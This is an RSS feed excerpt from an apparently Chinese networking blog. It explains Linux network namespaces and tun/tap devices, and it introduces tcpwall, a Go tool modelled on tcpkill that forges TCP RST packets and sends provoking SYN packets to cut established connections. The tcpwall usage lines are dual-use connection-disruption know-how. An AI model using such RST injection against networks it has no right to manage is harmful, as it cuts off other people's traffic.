&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将虚拟网卡tap0，tap1分别移动到ns0和ns1中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set tap0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set tap1 netns ns1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在宿主机器上使用&lt;code>ping 10.0.0.1&lt;/code>测试与tap0的网络连通性&lt;/p></description></item><item><title>Linux tun/tap 详解</title><link>https://www.typesafe.cn/posts/linux-tun-tap/</link><pubDate>Sun, 08 Nov 2020 22:11:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-tun-tap/</guid><description>&lt;blockquote>
&lt;p>在计算机网络中，&lt;strong>tun&lt;/strong>与&lt;strong>tap&lt;/strong>是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。&lt;/p>&lt;/blockquote>
&lt;h3 id="tuntap是什么">tun/tap是什么？&lt;/h3>
&lt;p>tun是网络层的虚拟网络设备，可以收发第三层数据报文包，如IP封包，因此常用于一些点对点IP隧道，例如OpenVPN，IPSec等。&lt;/p>
&lt;p>tap是链路层的虚拟网络设备，等同于一个以太网设备，它可以收发第二层数据报文包，如以太网数据帧。Tap最常见的用途就是做为虚拟机的网卡，因为它和普通的物理网卡更加相近，也经常用作普通机器的虚拟网卡。&lt;/p>
&lt;h3 id="如何操作tuntap">如何操作tun/tap？&lt;/h3>
&lt;p>Linux tun/tap可以通过网络接口和字符设备两种方式进行操作。&lt;/p>
&lt;p>当应用程序使用标准网络接口socket API操作tun/tap设备时，和操作一个真实网卡无异。&lt;/p>
&lt;p>当应用程序使用字符设备操作tun/tap设备时，字符设备即充当了用户空间和内核空间的桥梁直接读写二层或三层的数据报文。在 Linux 内核 2.6.x 之后的版本中，tun/tap 对应的字符设备文件分别为：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tun：/dev/net/tun
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tap：/dev/tap0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当应用程序打开字符设备时，系统会自动创建对应的虚拟设备接口，一般以tunX和tapX方式命名，虚拟设备接口创建成功后，可以为其配置IP、MAC地址、路由等。当一切配置完毕，应用程序通过此字符文件设备写入IP封包或以太网数据帧，tun/tap的驱动程序会将数据报文直接发送到内核空间，内核空间收到数据后再交给系统的网络协议栈进行处理，最后网络协议栈选择合适的物理网卡将其发出，到此发送流程完成。而物理网卡收到数据报文时会交给网络协议栈进行处理，网络协议栈匹配判断之后通过tun/tap的驱动程序将数据报文原封不动的写入到字符设备上，应用程序从字符设备上读取到IP封包或以太网数据帧，最后进行相应的处理，收取流程完成。&lt;/p>
&lt;blockquote>
&lt;p>注意：当应用程序关闭字符设备时，系统也会自动删除对应的虚拟设备接口，并且会删除掉创建的路由等信息。&lt;/p>&lt;/blockquote>
&lt;h3 id="tuntap的区别">tun/tap的区别&lt;/h3>
&lt;p>tun/tap 虽然工作原理一致，但是工作的层次不一样。&lt;/p>
&lt;p>tun是三层网络设备，收发的是IP层数据包，无法处理以太网数据帧，例如OpenVPN的路由模式就是使用了tun网络设备，OpenVPN Server重新规划了一个网段，所有的客户端都会获取到该网段下的一个IP，并且会添加对应的路由规则，而客户端与目标机器产生的数据报文都要经过OpenVPN网关才能转发。&lt;/p>
&lt;p>tap是二层网络设备，收发以太网数据帧，拥有MAC层的功能，可以和物理网卡通过网桥相连，组成一个二层网络。例如OpenVPN的桥接模式可以从外部打一条隧道到本地网络。进来的机器就像本地的机器一样参与通讯，丝毫看不出这些机器是在远程。如果你有使用过虚拟机的经验，桥接模式也是一种十分常见的网络方案，虚拟机会分配到和宿主机器同网段的IP，其他同网段的机器也可以通过网络访问到这台虚拟机。&lt;/p>
&lt;h3 id="使用方式">使用方式&lt;/h3>
&lt;p>Linux 提供了一些命令行程序方便我们来创建持久化的tun/tap设备，但是如果没有应用程序打开对应的文件描述符，tun/tap的状态一直会是DOWN，还好的是这并不会影响我们把它当作普通网卡去使用。&lt;/p>
&lt;p>使用&lt;code>ip tuntap help&lt;/code>查看使用帮助&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Usage: ip tuntap &lt;span style="color:#f92672">{&lt;/span> add | del | show | list | lst | help &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">[&lt;/span> dev PHYS_DEV &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">[&lt;/span> mode &lt;span style="color:#f92672">{&lt;/span> tun | tap &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> user USER &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> group GROUP &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">[&lt;/span> one_queue &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> pi &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> vnet_hdr &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> multi_queue &lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span> name NAME &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Where:	USER :&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> STRING | NUMBER &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	GROUP :&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> STRING | NUMBER &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="示例">示例&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 创建 tap &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap0 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 创建 tun&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tun0 mode tun 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 删除 tap&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap del dev tap0 mode tap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 删除 tun&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap del dev tun0 mode tun 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>tun/tap 设备创建成功后可以当作普通的网卡一样使用，因此我们也可以通过&lt;code>ip link&lt;/code>命令来操作它。&lt;/p></description></item><item><title>tcpkill在go语言下的实现和增强</title><link>https://www.typesafe.cn/posts/tcpwall/</link><pubDate>Sat, 31 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/tcpwall/</guid><description>&lt;h2 id="tcpwall">tcpwall&lt;/h2>
&lt;p>当我们想要阻止某些TCP连接的建立，在Linux平台上有一个很好的解决方案&lt;strong>iptables&lt;/strong>，但是对那些已经建立的tcp连接，iptables就不能做到随心所欲的阻断了。&lt;/p>
&lt;p>我在互联网上检索的时候发现了&lt;strong>tcpkill&lt;/strong>这个工具，tcpkill是一个网络分析工具集&lt;strong>dsniff&lt;/strong>中的一个小工具。在Linux上可以直接通过dsniff包安装，使用方式也非常简单。&lt;/p>
&lt;p>通过测试我发现tcpkill在执行命令之后并不会立刻阻断tcp连接，而是等待有数据传输时，才会阻断，因此在执行完命令之后程序并不会主动退出，而是需要通过&lt;em>&lt;strong>Ctrl+C&lt;/strong>&lt;/em>来退出，这对于某些想要通过程序来调用的脚本小子（例如我）来说简直是个灾难。&lt;/p>
&lt;h2 id="如何阻断一个已经建立的tcp连接">如何阻断一个已经建立的tcp连接？&lt;/h2>
&lt;p>阻断一个已经建立的tcp连接通常有这几种方案：&lt;/p>
&lt;ol>
&lt;li>服务端主动断开&lt;/li>
&lt;li>客户端主动断开&lt;/li>
&lt;li>拔掉网线（时间要超过tcp超时时间）&lt;/li>
&lt;li>伪造RST数据包发送给服务端和客户端让它们主动断开（tcpkill就是这么做的）&lt;/li>
&lt;/ol>
&lt;p>前三种局限性太大，只能用第4种了。&lt;/p>
&lt;h2 id="如何实现伪造rst数据报文包">如何实现伪造RST数据报文包？&lt;/h2>
&lt;p>&lt;a href="https://github.com/google/gopacket">GoPacket&lt;/a> 是go基于&lt;strong>libpcap&lt;/strong>构建的一个库，可以通过旁路的方式接收一份数据包的拷贝。因此我们可以很方便捕获到正在通信的tcp数据报文。通过数据报文，我们可以获取到通信双方的MAC地址，IP和端口号，以及ACK号等，这些都是伪造数据包必不可少的。&lt;/p>
&lt;p>在学习了&lt;strong>tcpkill&lt;/strong>的源码之后，我使用go开发了一个增强版的&lt;strong>tcpwall&lt;/strong>，&lt;strong>tcpwall&lt;/strong>不仅可以实现和&lt;strong>tcpkill&lt;/strong>同样的基于ip或端口监听到指定数据报文之后伪造RST数据报文来阻断tcp连接，也可以通过源ip源端口，目的ip目的端口来主动发送SYN数据报文包来诱导那些没有数据的tcp连接发送ACK数据报文包以获取源MAC、目的MAC和ACK号，并且可以通过指定参数让程序等待一段时间后主动退出。&lt;/p>
&lt;h2 id="如何使用">如何使用&lt;/h2>
&lt;p>阻断指定IP和端口的TCP连接（不关心是源或者目的）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#f92672">{&lt;/span>interface&lt;span style="color:#f92672">}&lt;/span> -host &lt;span style="color:#f92672">{&lt;/span>host&lt;span style="color:#f92672">}&lt;/span> -port &lt;span style="color:#f92672">{&lt;/span>port&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定源IP和源端口的TCP连接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#f92672">{&lt;/span>interface&lt;span style="color:#f92672">}&lt;/span> -shost &lt;span style="color:#f92672">{&lt;/span>src_host&lt;span style="color:#f92672">}&lt;/span> -sport &lt;span style="color:#f92672">{&lt;/span>src_port&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定目的IP和目的端口的TCP连接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#f92672">{&lt;/span>interface&lt;span style="color:#f92672">}&lt;/span> -dhost &lt;span style="color:#f92672">{&lt;/span>dst_host&lt;span style="color:#f92672">}&lt;/span> -dport &lt;span style="color:#f92672">{&lt;/span>dst_port&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定源IP、源端口、目的IP、目的端口的TCP连接（会主动向双方发送SYN数据报文包）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#f92672">{&lt;/span>interface&lt;span style="color:#f92672">}&lt;/span> -shost &lt;span style="color:#f92672">{&lt;/span>src_host&lt;span style="color:#f92672">}&lt;/span> -sport &lt;span style="color:#f92672">{&lt;/span>src_port&lt;span style="color:#f92672">}&lt;/span> -dhost &lt;span style="color:#f92672">{&lt;/span>dst_host&lt;span style="color:#f92672">}&lt;/span> -dport &lt;span style="color:#f92672">{&lt;/span>dst_port&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="其他">其他&lt;/h2>
&lt;ul>
&lt;li>-timeout 时间（秒）指定等待多久之后退出程序&lt;/li>
&lt;/ul>
&lt;p>项目地址 &lt;a href="https://github.com/dushixiang/tcpwall">https://github.com/dushixiang/tcpwall&lt;/a>&lt;/p></description></item></channel></rss>